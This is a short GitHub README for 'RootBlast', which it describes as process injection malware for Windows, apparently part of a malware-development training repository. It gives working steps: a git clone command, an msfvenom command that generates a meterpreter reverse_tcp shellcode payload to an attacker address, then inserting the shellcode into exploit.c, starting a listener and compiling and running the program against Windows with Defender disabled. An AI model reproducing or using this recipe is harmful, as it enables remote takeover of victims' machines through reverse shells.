# RootBlast

Process injection malware that clones windows processes, injects them with shellcode and executes them to attempt numerous reverse shells on the attacker. (Made with 🤎 for Windows users)

## Usage
+ Clone the repo
```
git clone https://github.com/spirizeon/rootblast
```
+ Generate shellcode through msfvenom 
```
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<IP adress> LPORT=443 -f c --var-name=shellcode
```
+ Replace shellcode with that in `exploit.c`

+ Start the listener on the Attacker machine (Run msfconsole as sudo)

![image](https://github.com/Spirizeon/maldev-training/assets/123345456/a78fc663-07fa-48c1-a65e-e68db3c4d29c)

+ Compile the code (MSVC compiler recommended) and execute

![image](https://github.com/Spirizeon/maldev-training/assets/123345456/9a44d8ad-cf9e-435e-af46-a74f270057a9)

## Tech Stack

**Attacker** Kali Linux/ParrotOS VMs, metasploit-framework

**Target:** Windows 7/10/11 (with Windows defender turned off)

